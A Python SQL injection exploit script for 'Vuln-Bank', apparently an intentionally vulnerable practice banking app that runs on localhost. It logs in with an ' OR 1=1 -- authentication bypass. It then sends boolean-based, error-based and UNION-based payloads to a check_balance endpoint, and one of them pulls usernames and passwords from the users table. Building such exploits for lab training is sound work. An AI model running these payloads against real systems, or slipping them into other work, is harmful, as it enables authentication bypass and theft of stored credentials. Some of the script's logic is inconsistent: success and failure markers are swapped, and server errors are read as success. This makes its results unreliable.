#!/usr/bin/env python3
"""
Modified Card Type SQL Injection Exploit for Vuln-Bank

This script demonstrates a critical SQL injection vulnerability in the Vuln-Bank application
where the application doesn't properly sanitize input parameters, allowing an attacker
to perform SQL injection attacks that can lead to data exfiltration, authentication bypass, and more.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5005
"""

import requests
import json
import sys
import argparse
import time

def login(base_url, username="admin", password="admin123"):
    """
    Login to get a valid JWT token

    Args:
        base_url: The base URL of the vulnerable application
        username: Username to use for login
        password: Password to use for login

    Returns:
        tuple: (token, user_data) if login successful, (None, None) otherwise
    """
    print(f"[*] Logging in as {username}...")

    login_url = f"{base_url}/login"
    payload = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(login_url, headers=headers, json=payload)

        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"[+] Login successful! Got valid JWT token.")
                return (token, data)
            else:
                print(f"[-] Login successful but no token received.")
                return (None, None)
        else:
            print(f"[-] Login failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return (None, None)
    except Exception as e:
        print(f"[-] Error during login: {str(e)}")
        return (None, None)

def test_sqli_in_check_balance(base_url, token, payload):
    """
    Test SQL injection in the check_balance endpoint

    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication
        payload: SQL injection payload to inject

    Returns:
        tuple: (success, response_data) where success is a boolean and response_data is the response data
    """
    print(f"[*] Testing SQL injection in check_balance endpoint with payload: {payload}")

    balance_url = f"{base_url}/check_balance/{payload}"
    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = requests.get(balance_url, headers=headers)

        if response.status_code == 200:
            print(f"[+] Request successful!")
            return (True, response.json())
        elif response.status_code == 500:
            print(f"[!] Server error (500) - This might indicate a successful SQL injection")
            print(f"[!] Response: {response.text}")
            return (True, response.text)
        else:
            print(f"[-] Request failed. Status code: {response.status_code}")
            print(f"[-] Response: {response.text}")
            return (False, response.text)
    except Exception as e:
        print(f"[-] Error during request: {str(e)}")
        return (False, str(e))

def test_boolean_based_sqli(base_url, token):
    """
    Test for boolean-based SQL injection

    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication

    Returns:
        bool: True if vulnerable, False otherwise
    """
    print(f"[*] Testing for boolean-based SQL injection...")

    # Test with a true condition
    true_payload = "ADMIN001' AND 1=1 --"
    true_success, true_response = test_sqli_in_check_balance(base_url, token, true_payload)

    # Test with a false condition
    false_payload = "ADMIN001' AND 1=2 --"
    false_success, false_response = test_sqli_in_check_balance(base_url, token, false_payload)

    # Compare responses to determine if boolean-based injection is possible
    if true_success and not false_success:
        print(f"[-] Vulnerability confirmed! Boolean-based SQL injection is possible.")
        return True
    else:
        print(f"[+] Boolean-based SQL injection test inconclusive.")
        return False

def test_error_based_sqli(base_url, token):
    """
    Test for error-based SQL injection

    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication

    Returns:
        bool: True if vulnerable, False otherwise
    """
    print(f"[*] Testing for error-based SQL injection...")

    # Test with a payload that should cause a database error
    error_payload = "ADMIN001' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
    success, response = test_sqli_in_check_balance(base_url, token, error_payload)

    # Check if the response contains database error messages
    if success and isinstance(response, str) and ("error" in response.lower() or "exception" in response.lower() or "syntax" in response.lower()):
        print(f"[-] Vulnerability confirmed! Error-based SQL injection is possible.")
        return True
    else:
        print(f"[+] Error-based SQL injection test inconclusive.")
        return False

def extract_user_data(base_url, token):
    """
    Attempt to extract user data using SQL injection

    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication

    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Attempting to extract user data...")

    # UNION-based SQL injection to extract user data
    union_payload = "ADMIN001' UNION SELECT username, password FROM users --"
    success, response = test_sqli_in_check_balance(base_url, token, union_payload)

    if success:
        print(f"[-] Vulnerability confirmed! UNION-based SQL injection is possible.")
        print(f"[-] Response: {json.dumps(response, indent=2) if isinstance(response, dict) else response}")
        return True
    else:
        print(f"[+] UNION-based SQL injection test inconclusive.")
        return False

def main():
    parser = argparse.ArgumentParser(description='Modified Card Type SQL Injection Exploit for Vuln-Bank')
    parser.add_argument('target_url', nargs='?', default='http://localhost:5005', help='Target URL of the Vuln-Bank application')
    parser.add_argument('--username', default="' OR 1=1 --", help='Username to use for login')
    parser.add_argument('--password', default='anything', help='Password to use for login')
    parser.add_argument('--payload', default=None, help='Custom SQL injection payload to use')
    args = parser.parse_args()

    base_url = args.target_url.rstrip('/')

    print(f"=== Vuln-Bank SQL Injection Exploit ===")
    print(f"[*] Target: {base_url}")

    # Login to get a token
    token, user_data = login(base_url, args.username, args.password)

    if not token:
        print(f"[-] Failed to get token. Exiting.")
        sys.exit(1)

    # If a custom payload is provided, use it
    if args.payload:
        success, response = test_sqli_in_check_balance(base_url, token, args.payload)
        print(f"[!] Custom payload test complete.")
    else:
        # Otherwise, run the standard tests
        boolean_vulnerable = test_boolean_based_sqli(base_url, token)
        error_vulnerable = test_error_based_sqli(base_url, token)
        union_vulnerable = extract_user_data(base_url, token)

    print(f"\n=== Summary of Findings ===")

    if args.payload:
        if success:
            print(f"[-] Custom payload test was successful.")
        else:
            print(f"[+] Custom payload test failed.")
    else:
        if boolean_vulnerable or error_vulnerable or union_vulnerable:
            print(f"[-] Application is vulnerable to SQL Injection")
            print(f"[-] This is a critical vulnerability that allows attackers to extract sensitive data and potentially take control of the database")

            if boolean_vulnerable:
                print(f"[-] Boolean-based SQL injection: Vulnerable")
            if error_vulnerable:
                print(f"[-] Error-based SQL injection: Vulnerable")
            if union_vulnerable:
                print(f"[-] UNION-based SQL injection: Vulnerable")
        else:
            print(f"[+] Application does not appear to be vulnerable to SQL Injection")

    print(f"\n[!] SQL Injection testing complete.")

if __name__ == "__main__":
    main()
